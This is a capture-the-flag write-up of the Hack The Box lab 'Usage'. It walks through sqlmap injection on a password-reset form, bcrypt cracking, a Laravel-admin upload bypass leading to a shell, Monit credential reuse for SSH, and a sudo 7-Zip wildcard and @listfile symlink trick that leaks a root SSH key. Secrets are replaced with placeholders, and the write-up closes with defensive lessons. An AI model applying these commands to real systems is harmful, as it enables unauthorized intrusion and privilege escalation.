---
title: "Usage: SQL Injection, Upload Validation Bypass, and 7-Zip Wildcard Abuse"
description: "SQL injection in a password-reset workflow and a Laravel-admin upload-validation bypass provide a foothold; reused Monit credentials enable SSH, and wildcard and @listfile handling in a sudo 7-Zip backup reach a protected root key."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - sql-injection
  - file-upload
  - credential-reuse
  - privilege-escalation
  - 7zip
---

## Summary

Usage is a retired Hack The Box Linux lab. The notes report an attack chain from web enumeration through SQL injection in a password-reset workflow, an authenticated upload-validation bypass, service-credential reuse, and privileged backup abuse. Target-specific values, credentials, hashes, private keys, flags, and operator details are replaced with placeholders.

## Context and Objective

- **Environment:** Linux target hosting an nginx-backed Laravel application.
- **Starting position:** unauthenticated access to exposed SSH and HTTP services.
- **Objective:** identify the web attack surface, obtain a foothold, and assess local privilege-escalation paths.
- **Scope:** Hack The Box lab activity only.

## Approach and Evidence

### 1. Service and Virtual-Host Enumeration

**Observation:** A TCP scan identified SSH and HTTP. Recorded HTTP output indicated a redirect to a virtual host.

**Action:** The notes used version and default-script scanning, then enumerated web paths and virtual hosts.

```bash
nmap <TARGET_IP> -p- -Pn -sC -sV -oN <SCAN_OUTPUT>
feroxbuster --url http://<TARGET_HOST> --wordlist <WORDLIST>
gobuster vhost --url http://<TARGET_HOST> --wordlist <WORDLIST> --append-domain
```

```text
22/tcp open  ssh
80/tcp open  http
<PASSWORD_RESET_ROUTE>
<ADMIN_VHOST>
```

**Technical significance:** Virtual-host routing can expose application components unavailable through the default HTTP host.

**Result:** The notes report discovery of a password-reset route and a separate administrative virtual host.

### 2. Password-Reset SQL Injection and Credential Recovery

**Observation:** The password-reset request's email parameter accepted SQL injection testing. The initial threaded table dump contained a malformed bcrypt value.

**Action:** The notes enumerated the backend database, identified the administrative-user table, then used a direct query with length and hexadecimal output to validate the recovered hash before offline cracking.

```bash
sqlmap -r <REQUEST_FILE> -p email --batch --level 3 --dbs --threads 10
sqlmap -r <REQUEST_FILE> -p email --batch --level 3 --threads 10 \
  --sql-query="SELECT id,username,password,LENGTH(password),HEX(password) FROM <DATABASE>.<ADMIN_TABLE> WHERE username='<ADMIN_USER>'"
hashcat <HASH_FILE> <WORDLIST> -D 2 -m 3200
```

```text
back-end DBMS: MySQL >= 8.0.0
available databases [3]:
[*] <APPLICATION_DATABASE>
<ADMIN_USER>,<BCRYPT_HASH>,60,<HEX_ENCODED_HASH>
```

**Technical significance:** Direct validation of length and byte representation avoids relying on a corrupted extraction before password recovery.

**Result:** The notes report recovery of an administrative password from the validated bcrypt hash.

### 3. Authenticated Upload-Validation Bypass

**Observation:** The administrative interface exposed a Laravel-admin upload function. The notes associate its validation behavior with a filename-extension bypass.

**Action:** The notes created an image-formatted server-side payload, uploaded it, changed its filename extension during the request, and triggered the resulting uploaded file while a listener waited.

```bash
python3 <FILE_FORGE_TOOL> forge --payload-file <SERVER_SIDE_PAYLOAD> --type jpg --output <IMAGE_FILE> --separator newline
nc -nlvp <LISTENER_PORT>
```

```text
<LOW_PRIVILEGE_USER>@<TARGET_HOST>:/$ id
uid=<UID>(<LOW_PRIVILEGE_USER>) gid=<GID>(<LOW_PRIVILEGE_USER>) groups=<GID>(<LOW_PRIVILEGE_USER>)
```

**Technical significance:** Upload controls that rely on client-controlled names or superficial type checks can permit server-side code execution when uploads are web-accessible.

**Result:** The notes report code execution as a low-privilege local user after the upload bypass.

### 4. Local Service Configuration and Account Access

**Observation:** The low-privilege user's home directory contained Monit configuration artifacts, including a readable configuration file. The file contained credentials for the local monitoring service.

**Action:** The notes enumerated the home directory, reviewed the monitoring configuration, and tested the recovered password for SSH access to a different local account.

```bash
ls -la /home/<LOW_PRIVILEGE_USER>
cat ~/.monitrc
ssh <SECOND_USER>@<TARGET_HOST>
```

```text
set httpd port <MONIT_PORT>
allow <MONIT_USER>:<MONIT_PASSWORD>

<SECOND_USER>@<TARGET_HOST>:~$ id
uid=<UID>(<SECOND_USER>) gid=<GID>(<SECOND_USER>) groups=<GID>(<SECOND_USER>)
```

**Technical significance:** Credentials stored in user-readable service configuration can bridge local service access and operating-system account access when reused.

**Result:** The notes report that the monitoring-service password authenticated the second local user over SSH.

### 5. Privileged Backup Path Discovery

**Observation:** The second user could run a custom management binary through sudo without a password. String inspection showed a project-backup operation invoking `7za` with a wildcard from a writable directory.

**Action:** The notes enumerated sudo rights and inspected the binary's embedded command strings.

```bash
sudo -l
strings /usr/bin/<MANAGEMENT_BINARY>
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/<MANAGEMENT_BINARY>
/usr/bin/7za a <BACKUP_ARCHIVE> -tzip -snl -mmt -- *
```

**Technical significance:** Wildcard expansion in a privileged archive operation can allow attacker-controlled filenames to alter archive input handling.

**Result:** The notes report a sudo-allowed backup path using `7za` with wildcard-expanded input.

### 6. 7-Zip List-File Abuse and Root Access

**Observation:** The writable backup directory and `7za` list-file behavior allowed an `@`-prefixed filename to reference a symlinked protected file during the privileged archive operation.

**Action:** The notes created an `@` list-file reference and a symlink to a protected SSH key, then selected the project-backup function in the management utility.

```bash
cd <WRITABLE_PROJECT_DIRECTORY>
touch -- @<LIST_FILE>
ln -s <PROTECTED_KEY_PATH> <SYMLINK_NAME>
sudo /usr/bin/<MANAGEMENT_BINARY>
```

```text
Choose an option:
1. Project Backup

<PROTECTED_FILE_CONTENT>
```

**Technical significance:** `@listfile` processing can turn wildcard-driven archive input into arbitrary-file disclosure when a privileged process traverses attacker-controlled names.

**Result:** The notes report disclosure of a root SSH private key and subsequent root access; key material and flag content are omitted.

## Challenges and Decisions

- **Malformed threaded hash dump:** The notes report that a threaded extraction corrupted part of the bcrypt value. A direct query with `LENGTH()` and `HEX()` established a validated value before cracking.
- **Upload validation:** The notes report that changing the uploaded filename extension in transit bypassed the observed validation behavior.
- **Wildcard archive handling:** The notes report use of a symlink and an `@` list-file reference because the privileged backup operation expanded a wildcard in a writable directory.

## Outcome

The notes report a complete chain: web enumeration, password-reset SQL injection, administrative access, upload-based code execution, monitoring-credential reuse, and root access through privileged 7-Zip wildcard abuse. Available notes provide command excerpts and local identity output for stages of the chain; sensitive values and flag content are intentionally omitted.

## Lessons and Recommendations

1. **Use parameterized database queries.** Recommendation: password-reset workflows should bind user input rather than constructing SQL queries from request values.
2. **Validate extracted secrets before use.** The notes report that length and hexadecimal checks prevented cracking an incomplete bcrypt value.
3. **Treat uploads as untrusted content.** Recommendation: validate content server-side and store uploads outside executable web paths.
4. **Separate service and system credentials.** Recommendation: use unique credentials and restrict readability of service configuration files.
5. **Avoid wildcard input in privileged archive jobs.** Recommendation: use explicit, controlled file lists and prevent attacker-controlled filenames from influencing privileged backup operations.

## References

- Hack The Box machine: [Usage](https://app.hackthebox.com/machines/Usage)
- 7-Zip documentation for list-file handling
